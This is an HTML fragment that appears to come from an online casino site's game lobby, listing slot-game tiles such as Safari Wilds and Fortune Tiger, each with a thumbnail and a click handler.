                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Safari Wilds" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Safari Wilds', '/assets/games/i/165x220/pgshoft/de304fa447a90883dd0fab562e3c4f3d.webp?v=0.1' , '1594259', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/de304fa447a90883dd0fab562e3c4f3d.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Safari Wilds">Safari Wilds</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Ninja Raccoon Frenzy" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Ninja Raccoon Frenzy', '/assets/games/i/165x220/pgshoft/041557503e2052ad07714ecefd32cdbf.webp?v=0.1' , '1529867', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/041557503e2052ad07714ecefd32cdbf.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Ninja Raccoon Frenzy">Ninja Raccoon Frenzy</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Lucky Clover Riches" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Lucky Clover Riches', '/assets/games/i/165x220/pgshoft/419a730a7e63edfee4774023dc70fad8.webp?v=0.2' , '1601012', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/419a730a7e63edfee4774023dc70fad8.webp?v=0.2" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Lucky Clover Riches">Lucky Clover Riches</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gladiator&amp;quot;amp;s Glory" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gladiator&amp;quot;amp;s Glory', '/assets/games/i/165x220/pgshoft/6a82d9ea039130067f1a52a6ce0022cc.webp?v=0.1' , '1572362', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/6a82d9ea039130067f1a52a6ce0022cc.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gladiator's Glory">Gladiator's Glory</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Cruise Royale" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Cruise Royale', '/assets/games/i/165x220/pgshoft/2465a98a77eceef126a3eb0687cf273d.webp?v=0.1' , '1473388', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/2465a98a77eceef126a3eb0687cf273d.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Cruise Royale">Cruise Royale</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fruity Candy" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fruity Candy', '/assets/games/i/165x220/pgshoft/9e2c2043e9dde7d711925d12ae306938.webp?v=0.1' , '1397455', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/9e2c2043e9dde7d711925d12ae306938.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fruity Candy">Fruity Candy</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Super Golf Drive" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Super Golf Drive', '/assets/games/i/165x220/pgshoft/acde9d3c8f1677333189cc59b2d82bb3.webp?v=0.1' , '1513328', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/acde9d3c8f1677333189cc59b2d82bb3.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Super Golf Drive">Super Golf Drive</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mystical Spirits" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mystical Spirits', '/assets/games/i/165x220/pgshoft/4adbde382b56a54d0ceaa64e770d039b.webp?v=0.1' , '1432733', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/4adbde382b56a54d0ceaa64e770d039b.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mystical Spirits">Mystical Spirits</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Songkran Splash" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Songkran Splash', '/assets/games/i/165x220/pgshoft/20a5aed015ca16fec0c5b05e71970a9f.webp?v=0.1' , '1448762', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/20a5aed015ca16fec0c5b05e71970a9f.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Songkran Splash">Songkran Splash</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Bakery Bonanza" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Bakery Bonanza', '/assets/games/i/165x220/pgshoft/b92dee0179d7b9359c4c3b6b3d74cd99.webp?v=0.4' , '1418544', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/b92dee0179d7b9359c4c3b6b3d74cd99.webp?v=0.4" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Bakery Bonanza">Bakery Bonanza</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Hawaiian Tiki" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Hawaiian Tiki', '/assets/games/i/165x220/pgshoft/466cb5eaac06ec46d299da0c31805bd2.webp?v=0.1' , '1381200', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/466cb5eaac06ec46d299da0c31805bd2.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Hawaiian Tiki">Hawaiian Tiki</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Rave Party Fever" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Rave Party Fever', '/assets/games/i/165x220/pgshoft/c80e8e5c1fcf6d8ee754d6a27fa77ee3.webp?v=0.1' , '1420892', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/c80e8e5c1fcf6d8ee754d6a27fa77ee3.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Rave Party Fever">Rave Party Fever</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fortune Rabbit" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fortune Rabbit', '/assets/games/i/165x220/pgshoft/ef63ce13ecbe9ceccecd8140859ec7d5.webp?v=0.1' , '1543462', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/ef63ce13ecbe9ceccecd8140859ec7d5.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fortune Rabbit">Fortune Rabbit</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Diner Delights" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Diner Delights', '/assets/games/i/165x220/pgshoft/803728b8f11dd3b1dbef254176acbf6d.webp?v=0.1' , '1372643', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/803728b8f11dd3b1dbef254176acbf6d.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Diner Delights">Diner Delights</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Alchemy Gold" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Alchemy Gold', '/assets/games/i/165x220/pgshoft/2642986ac17c6ef526ff64e6de0ba923.webp?v=0.1' , '1368367', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/2642986ac17c6ef526ff64e6de0ba923.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Alchemy Gold">Alchemy Gold</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Totem Wonders" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Totem Wonders', '/assets/games/i/165x220/pgshoft/7544fa1d4a72ff22d36fb34951916457.webp?v=0.1' , '1338274', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/7544fa1d4a72ff22d36fb34951916457.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Totem Wonders">Totem Wonders</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Prosperity Fortune Tree" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Prosperity Fortune Tree', '/assets/games/i/165x220/pgshoft/0989779cd07aa7fbdfdce8d893c4b64d.webp?v=0.1' , '1312883', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/0989779cd07aa7fbdfdce8d893c4b64d.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Prosperity Fortune Tree">Prosperity Fortune Tree</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wild Coaster" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wild Coaster', '/assets/games/i/165x220/pgshoft/0ed3e2548af7c3f198076f74eb67941c.webp?v=0.1' , '132', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/0ed3e2548af7c3f198076f74eb67941c.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wild Coaster">Wild Coaster</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Legend of Perseus" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Legend of Perseus', '/assets/games/i/165x220/pgshoft/74b569a22e0aeb9d163ee4e929add9c8.webp?v=0.1' , '128', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/74b569a22e0aeb9d163ee4e929add9c8.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Legend of Perseus">Legend of Perseus</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Lucky Piggy" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Lucky Piggy', '/assets/games/i/165x220/pgshoft/90691f4b84fbced3753d3d3c5092010c.webp?v=0.1' , '130', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/90691f4b84fbced3753d3d3c5092010c.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Lucky Piggy">Lucky Piggy</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Win Win Fish Prawn Crab" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Win Win Fish Prawn Crab', '/assets/games/i/165x220/pgshoft/1eba11aa09a7fa9c29faade311e9fadf.webp?v=0.1' , '129', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/1eba11aa09a7fa9c29faade311e9fadf.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Win Win Fish Prawn Crab">Win Win Fish Prawn Crab</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Battleground Royale" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Battleground Royale', '/assets/games/i/165x220/pgshoft/880782a7c44e6971ecff03fd10445197.webp?v=0.1' , '124', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/880782a7c44e6971ecff03fd10445197.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Battleground Royale">Battleground Royale</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="The Queen&amp;quot;amp;s Banquet" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'The Queen&amp;quot;amp;s Banquet', '/assets/games/i/165x220/pgshoft/eb39aa13a8c4481ed8c773623591a837.webp?v=0.1' , '120', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/eb39aa13a8c4481ed8c773623591a837.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="The Queen's Banquet">The Queen's Banquet</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Rooster Rumble" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Rooster Rumble', '/assets/games/i/165x220/pgshoft/e7aa70aefc9c6afdac71b8b173935708.webp?v=0.1' , '123', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/e7aa70aefc9c6afdac71b8b173935708.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Rooster Rumble">Rooster Rumble</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Butterfly Blossom" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Butterfly Blossom', '/assets/games/i/165x220/pgshoft/364c482cb87a4858238900c6ff3fa27d.webp?v=0.1' , '125', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/364c482cb87a4858238900c6ff3fa27d.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Butterfly Blossom">Butterfly Blossom</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Destiny of Sun &amp;quot; Moon" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Destiny of Sun &amp;quot; Moon', '/assets/games/i/165x220/pgshoft/900eaf6c102abe8f28404c72b99cd856.webp?v=0.1' , '121', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/900eaf6c102abe8f28404c72b99cd856.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Destiny of Sun &amp; Moon">Destiny of Sun &amp; Moon</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fortune Tiger" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fortune Tiger', '/assets/games/i/165x220/pgshoft/3a7a35e5d52aaf408aaa5336cbee1b48.webp?v=0.1' , '126', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/3a7a35e5d52aaf408aaa5336cbee1b48.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fortune Tiger">Fortune Tiger</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Oriental Prosperity" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Oriental Prosperity', '/assets/games/i/165x220/pgshoft/32070fa4f8e3c61a52e3b8c528c93424.webp?v=0.1' , '112', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/32070fa4f8e3c61a52e3b8c528c93424.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Oriental Prosperity">Oriental Prosperity</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mask Carnival" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mask Carnival', '/assets/games/i/165x220/pgshoft/7c12e3843734aeb7ad7d69caaa617612.webp?v=0.1' , '118', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/7c12e3843734aeb7ad7d69caaa617612.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mask Carnival">Mask Carnival</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mermaid Riches" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mermaid Riches', '/assets/games/i/165x220/pgshoft/0958b1e5113d96691b614cc78b8690f8.webp?v=0.1' , '102', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/0958b1e5113d96691b614cc78b8690f8.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mermaid Riches">Mermaid Riches</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Emoji Riches" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Emoji Riches', '/assets/games/i/165x220/pgshoft/9349bd33e657a2da6306c4595e87e181.webp?v=0.2' , '114', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/9349bd33e657a2da6306c4595e87e181.webp?v=0.2" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Emoji Riches">Emoji Riches</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Spirited Wonders" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Spirited Wonders', '/assets/games/i/165x220/pgshoft/227c9ce72fd1ced1819e603d4257c243.webp?v=0.1' , '119', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/227c9ce72fd1ced1819e603d4257c243.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Spirited Wonders">Spirited Wonders</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Legendary Monkey King" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Legendary Monkey King', '/assets/games/i/165x220/pgshoft/bc6e6f1418990d02dd2597f0a49ebe24.webp?v=0.1' , '107', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/bc6e6f1418990d02dd2597f0a49ebe24.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Legendary Monkey King">Legendary Monkey King</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Buffalo Win" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Buffalo Win', '/assets/games/i/165x220/pgshoft/9d1a9ecc4874d714e5e6602aa3391e2a.webp?v=0.1' , '108', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/9d1a9ecc4874d714e5e6602aa3391e2a.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Buffalo Win">Buffalo Win</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Supermarket Spree" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Supermarket Spree', '/assets/games/i/165x220/pgshoft/790d3f7262afcc39f977e1af1fea0c5e.webp?v=0.1' , '115', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/790d3f7262afcc39f977e1af1fea0c5e.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Supermarket Spree">Supermarket Spree</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Raider Jane&amp;quot;amp;s Crypt of Fortune" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Raider Jane&amp;quot;amp;s Crypt of Fortune', '/assets/games/i/165x220/pgshoft/b0fc0be4e84602423d8245e4712da10b.webp?v=0.1' , '113', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/b0fc0be4e84602423d8245e4712da10b.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Raider Jane's Crypt of Fortune">Raider Jane's Crypt of Fortune</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Heist  Stakes" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Heist  Stakes', '/assets/games/i/165x220/pgshoft/56863031f8157f257d62d2d60ff3bea1.webp?v=0.1' , '105', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/56863031f8157f257d62d2d60ff3bea1.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Heist  Stakes">Heist  Stakes</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Rise of Apollo" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Rise of Apollo', '/assets/games/i/165x220/pgshoft/637b921a1e258a8dff251c59a92ba6d2.webp?v=0.1' , '101', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/637b921a1e258a8dff251c59a92ba6d2.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Rise of Apollo">Rise of Apollo</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Candy Bonanza" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Candy Bonanza', '/assets/games/i/165x220/pgshoft/075e6d03d8d46dd3eb39cc43a87c6bef.webp?v=0.1' , '100', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/075e6d03d8d46dd3eb39cc43a87c6bef.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Candy Bonanza">Candy Bonanza</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fortune Ox" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fortune Ox', '/assets/games/i/165x220/pgshoft/6d922bafdfb1c5d9ccfde6233dcd1895.webp?v=0.1' , '98', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/6d922bafdfb1c5d9ccfde6233dcd1895.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fortune Ox">Fortune Ox</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Bali Vacation" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Bali Vacation', '/assets/games/i/165x220/pgshoft/bed7c5740385fd184668f8e23b2d2ff7.webp?v=0.1' , '94', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/bed7c5740385fd184668f8e23b2d2ff7.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Bali Vacation">Bali Vacation</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Crypto Gold" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Crypto Gold', '/assets/games/i/165x220/pgshoft/78aa1b6b36e0e12a5e0439d8adb58a7d.webp?v=0.1' , '103', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/78aa1b6b36e0e12a5e0439d8adb58a7d.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Crypto Gold">Crypto Gold</h5>
        </a>
        
     
